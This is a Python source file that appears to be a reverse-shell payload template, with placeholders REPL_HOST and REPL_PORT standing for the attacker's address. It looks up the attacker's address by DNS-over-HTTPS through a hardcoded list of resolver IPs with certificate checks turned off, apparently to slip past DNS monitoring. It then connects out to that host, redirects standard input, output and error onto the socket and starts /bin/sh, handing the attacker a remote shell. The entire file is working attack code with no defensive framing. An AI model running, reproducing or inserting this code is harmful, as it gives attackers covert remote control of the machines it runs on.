import socket,subprocess,os,requests,re

ipv4 = "((([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5])[ (\[]?(\.|dot)[ )\]]?){3}([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5]))"

def listToString(s):
    str1 = ""

    for ele in s:
        str1 += ele
    return str1

host="REPL_HOST"
port=REPL_PORT

ipls = ["1.1.1.1", "1.0.0.1", "1.1.1.2", "1.0.0.2", "1.1.1.3", "1.0.0.3", "46.239.223.80", "139.99.222.72", "5.2.75.75", "45.67.219.208", "45.79.120.233", "185.213.26.187", "45.132.75.16", "45.91.95.12", "45.132.74.167", "185.175.56.133", "193.29.62.196", "103.73.64.132"]

client = requests.session()
params = {
        'name': host,
        'type': 'A',
        'ct': 'application/dns-json'
}

for ip in ipls:
    try:
        url = "https://"+ip+"/dns-query"
        data = client.get(url, params=params, verify=False, timeout=1)
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
        pass
    except requests.exceptions.HTTPError:
        pass
    else:
        break

json_data = str(data.json())
host = [match[0] for match in re.findall(ipv4, json_data)]
host = listToString(host)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call("/bin/sh")
